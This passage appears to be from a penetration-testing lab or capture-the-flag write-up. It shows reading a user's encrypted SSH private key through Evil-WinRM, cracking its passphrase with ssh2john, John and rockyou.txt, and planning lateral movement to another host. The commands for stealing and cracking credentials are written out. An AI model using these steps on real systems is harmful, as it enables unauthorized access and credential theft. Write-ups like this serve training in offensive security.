```

Notable contents:

- `.ssh` directory found under user profile.
    

#### 🔐 Sensitive File Discovery

```powershell
*Evil-WinRM* PS C:\Users\nicole.lewis\.ssh> type nlewis
```

Discovered encrypted RSA private key:

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,EFD2C336ED08BC8A3A05DFD37538D5F5
...
-----END RSA PRIVATE KEY-----
```

Also found public key:

```text
ssh-rsa AAAAB3Nza... dev@dev02
```

## 🚀 Privilege Escalation - SSH Private Key Cracking

Converted the encrypted private key into hash format using `ssh2john`:

```bash
ssh2john nlewis > nl.hash
```

Verified the hash:

```bash
cat nl.hash
```

Cracked with John and rockyou.txt wordlist:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt nl.hash
```

**Password:**

```
Password1 (for user: nlewis)
```

### 🧠 Post-Exploitation

Using cracked credentials and authorized public key:

- `nicole.lewis` can SSH into `dev02` as `dev` using the cracked password-protected key.
    

This gives lateral movement capability to another system.
